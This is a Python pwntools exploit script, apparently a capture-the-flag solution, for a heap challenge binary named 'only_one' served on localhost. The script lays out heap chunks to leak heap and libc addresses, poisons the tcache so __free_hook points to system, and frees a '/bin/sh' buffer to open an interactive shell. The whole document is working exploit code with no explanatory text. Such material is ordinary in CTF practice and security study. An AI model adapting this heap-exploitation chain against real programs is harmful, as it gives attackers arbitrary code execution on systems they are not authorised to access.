from pwn import *

p=remote("localhost",31337)
e=ELF("./only_one")
libc=e.libc
def make(size,msg):
    p.recvuntil("What do you want to do? :")
    p.sendline("1")
    p.recvuntil("size: ")
    p.sendline(str(size))
    p.recvuntil("content: ")
    p.send(msg)
def delete():
    p.recvuntil("What do you want to do? :")
    p.sendline("2")
def rd(n):
    p.recvuntil("What do you want to do? :")
    p.sendline("3")
    p.recvuntil("a"*n)
    return (p.recvline())
def bug(num):
    p.recvuntil("What do you want to do? :")
    p.sendline("4")
    p.recvuntil("(positive integer less than 2000)\n")
    p.sendline(str(num))


heap_base=0
pause()


make(240,"a")
delete()
payload = b'a'*720
payload +=p64(0x401)*6
make(768,payload)
delete()
make(80,"a")
delete()
make(16,"a")
delete()
make(272,"a")
make(64,"a")
delete()
make(32,"a")
delete()
make(720,p64(0x11)*90)
make(712,p64(0x11)*89)
bug(1312)
delete()
#======================heap leak
make(1008,"a"*32)
a=rd(32)
a=u64(a.rstrip().ljust(8,b"\x00"))
heap_base=a<<12
b=a
delete()
make(1008,b"b"*(0x18)+p64(0x61)+p64(a)+b'b'*0x50+p64(0x491)+p64(a)+b"b"*(0x10)+p64(0x121)+p64(a)+b'b'*0x110+p64(0xc1)+b"b"*0x48+p64(0x311))
delete()
make(16,"a")
delete()
make(1008,b"a"*0x80)
#===================libc_leak
a=rd(0x80)
a=u64(a.rstrip().ljust(8,b"\x00"))
main_arena = a-96
libc.address=main_arena - (libc.symbols["__malloc_hook"]+0x10)
print(hex(libc.address))
delete()
make(1008,b"a"*0x18 + p64(0x61)+p64(b)+b"a"*0x50 + p64(0x491))
delete()

make(0x20,"a")
delete()
make(0x40,"a")
delete()



free_hook = libc.symbols["__free_hook"]
print(hex(free_hook))
system_addr=libc.symbols["system"]
make(0xb0,b"d"*0x50+p64(free_hook^(b)))
make(0x300,"a")
make(0x300,p64(system_addr))
make(0x20,b"/bin/sh\x00")
delete()

pause()
p.interactive()
